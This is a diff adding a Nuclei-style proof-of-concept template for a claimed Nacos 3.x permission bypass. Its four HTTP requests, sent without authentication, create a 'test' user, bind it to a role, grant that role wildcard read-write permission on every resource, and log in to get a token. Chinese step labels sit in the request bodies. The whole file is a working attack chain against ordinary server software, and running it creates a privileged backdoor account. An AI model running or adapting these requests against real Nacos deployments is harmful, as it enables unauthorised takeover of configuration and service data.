@@ -1,0 +1,75 @@
+id: poc-tt2ypo0otsasunkw
+info:
+  name: Nacos 3.x.x permission存在权限绕过漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tt2ypo0otsasunkw'
+  tags: unauth,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tt2ypo0otsasunkw
+http:
+- raw:
+  - 'POST /nacos/v3/auth/user?username=test&password=1234@test HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: */*
+
+    Connection: close
+
+
+    绑定角色'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /nacos/v3/auth/role?role=test_role&username=test HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: */*
+
+    Connection: close
+
+
+    授予通配权限'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /nacos/v3/auth/permission?role=test_role&resource=*&action=rw HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: */*
+
+    Connection: close
+
+
+    登录换取 Token'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /nacos/v3/auth/user/login?username=test&password=1234%40test HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: */*
+
+    Connection: close
+
+
+    提权用户带 Token 访问数据面'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
